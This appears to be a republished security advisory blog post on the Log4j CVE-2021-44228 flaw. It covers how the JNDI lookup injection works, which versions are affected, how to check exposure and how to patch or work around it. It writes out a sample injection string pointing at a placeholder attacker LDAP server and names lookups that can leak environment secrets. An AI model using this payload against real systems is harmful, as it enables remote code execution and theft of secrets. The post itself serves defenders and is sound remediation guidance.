---
title: "The Worst Log Injection. Ever. (Log4j [2.0.0-alpha,2.14.1] )"
date: 2025-01-22
categories: 
  - "cybersecurity"
  - "cybersecurity-awareness"
  - "log4j"
  - "security"
  - "security-awareness"
tags: 
  - "appsec"
  - "cve-2021-44228"
  - "fixing"
---

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPZ_5pfkS1cqvswDQyDQPApPaJuMKVDynjevtlYpB5lb-d1hGSsI-_XWxLlDnojb1ShTL7q1gwDRLKjVrjet9moWUyVAUCN1UXWIsp-7wFhgHqVd5EeUQ7oPVPwzLRWpK8319Wq5216Q4/)

There has been such a hype about the Log4j issue and since IMQ Minded Security mission has always been about fixing, this informal post is about _what's going on_, _how to check_ if someone's system is likely affected and _how to fix the issue_.  
  

**UPDATE 12-17-2021**: Since several bypasses to the mitigations implemented on version 2.15/16 were found, **be sure to update to**  **Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later) as described here and here ASAP!**

### **What's the Buzz? (The Problem)**

On Thursday 12/09/2021 a vulnerability affecting a very popular logging Java library was published on Github. A few hours later the infosec community was on fire.

  
The issue falls in the category of _Template Language Injection_, which involves a parser that is triggered to perform certain actions when particular sequences are found in the parsed string.

  
The library is Log4j and the vulnerable methods (sinks) are the ones that are usually called to actually log messages in files to keep track of events happening during the execution of an application:

> - log
> - fatal
> - error
> - warn
> - trace
> - ..

(for a more technical code insight https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/). 

  

It means that, if the application wants to log some dynamic content coming from an external source, such as, _a message about an error login_ from a non existing username, it might call something like:

> logger.warn(username + " not found!");

If the username value is controlled by a malicious user it will be possible to exploit the vulnerability and even execute arbitrary code on the affected platform.

  

In particular, if an attacker is able to control the log message string, even partially, and he is able to inject the '**_${_**' and '_**}**_' metacharacters the Log4j Interpolator will parse the content and look for specific patterns.

  

According to the Interceptor class the following patterns are enabled by default:

> - log4j
> - sys 
> - env
> - main
> - marker
> - java
> - lower
> - upper
> - date
> - ctx
> - jndi (if org.apache.logging.log4j.core.lookup.JndiLookup is present)
> - web (if org.apache.logging.log4j.web.WebLookup is present)
> - docker 
> - spring
> - kubernetes

So, the real deal is about an attack that can be performed via JNDI:LDAP keyword (or similar patterns such as RMI, COS etc..). In fact by injecting something like:

> ${jndi:ldap://EVILLDAP:\[PORT\]/XX}

as argument in the sink method, Log4j will:

1. trigger a DNS request to check if the EVILLDAP hostname needs to be resolved
2. perform an LDAP request to the (attacker controlled) LDAP server hosted on the resolved IP
3. the attacker controlled LDAP server will then be able to reply with a malicious serialized Java object, which will be executed on the Log4j side.
4. if the malicious object, by abusing internal features (gadgets), is able to trigger the correct set of instruction, the vulnerability will be successfully exploited.

As can be noted, **this is a two stages attack,** in fact, after the vulnerability is triggered, the vulnerable application needs to send a request to the malicious server in order to get the RCE payload.

  

### **What's the Impact and How about the Risk? (****The Attack)**

The worst **impact** is the _Remote Code Execution_, which requires:

1. _the victim machine must be able to perform outbound requests_ 
2. _the attacker must be able to use the correct gadget chain to successfully perform the attack._

 Another important **impact** involves _Exfiltration of Confidential Information_ via other pattern such as:

> - env:KEY
> - sys:KEY
> - ctx:KEY
> - web:KEY
> - ..

In conjunction with DNS Requests or other layer 7 requests.

Which requires that:

1. the victim machine is allowed to perform DNS requests or perform outbound requests 

In this second attack the attacker will be able to gather information such as internal cryptography keys or similar data from application mapped strings.  
  

### **Which Version is Affected?**

All version of _Apache Log4j 2 until 2.15 excluded_ are affected.   
  

In particular: **2.0-beta9 <= Apache Log4j <= 2.14.1**

Log4j version 1 might be affected in some specific case if JNDI is enabled, but it is not by default.

  

**WARNING**: there is a bunch of blog posts asserting that **some Java version mitigates** the attacks, but that is **NOT true**. **The vulnerability is independent on the Java version.**

### **Am I Vulnerable? (The Check)**

There are several ways to check if some of the deployed application is vulnerable...the correct answer would be implement Supply Chain Management, but this paragraph is for practical, urgent actions.

If you've already implemented a process which allows to list:

- \***All**\* your applications and versions
- \***Where**\* they are deployed

That list is called SBOM (Software Bill of Materials) which list of all the used software, libraries included and their versions.  
If you have it, there are very good chances that the time spent to find & fix everything will be relatively small.

But, of course, having it depends on the maturity of the security process implemented in your company (check this out if you're interested in our services).

Consider an enterprise without a SBOM. They might have hundreds of deployed software from external vendors and internally developed custom software. Meaning it will require a big effort of time and resources to prioritize and patch.

If _no SBOM is in place_ then, the first thing to do is to roll up your sleeves and _for each instance_:

> 1. Login
> 2. Check if there are running processes using java.
> 3. Identify the directories and use the open source OWASP Dependency Check (or similar products).

_OWASP Dependency Check_ is able to recursively check for vulnerable libraries in a EAR/WAR/JAR deployed applications and also other files like _POM.xml_.

  

Finally, have a look at the Indicator Of Compromise list that might help in case there's already been a security incident.  
  

### How can I mitigate the risk? (The Fix)

**The permanent ones**:

- For each affected vendor you should ping them, asking for a patch or minor release. If they tell you that you must update to a major release and your product is not EOL, you should insist for a minor/patch level release which addresses the vulnerability.
- For each internal application update Log4j library to version **2.16**.

- WARNING: Log4j **2.16** requires Java 8, so if you have Java < 8 there might be some more time consuming effort. In that case see if the following workaround is worth trying.

  

**The workarounds:**

- if **Log4j version >= 2.10**, as explained here, you can do the following steps:

1. export the following ENVIRONMENT VARIABLE to the whole OS as LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS=true
2. relaunch the application.
3. Check if you're still vulnerable with a POC.

- For each affected machine:

- if **it's not supposed** to generate egress traffic **block** DNS requests and new outbound traffic.
- if **it's supposed** to generate outbound traffic, well...that falls into **anomaly detection** category, which could help but be sure that it is not a fingerprint based one since there's a lot of ways to bypass blocking rules.
- last but not least it might be interesting to experiment some kind of RASP, such as this one, which will be able to identify contextual traffic without the risk of bypasses.

Here's a nice InfoGraphics about the attack flow and the points of mitigation from GovCert.CH:

### 

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhF-Exzr5ukFDFaFJyintBwh6L_pKOV5ZWhyphenhyphenAXeKC1oAIud14Hn1tAMG9rz-kZGlOzDuXEYtTiYYh2N7WqxmtZNhdXA1RmHBwkoLg8aoKJKM9F7D9C3KG6M1YmBijHcxduw31BSKza2msc/)

  
  

### Conclusions

This post was written in order to give some clarification about the CVE-2021-44228 and to give some thoughtful information regarding attacks, checks and fixes. 

Please comment/email us if you need more clarifications.

  

Go to Source
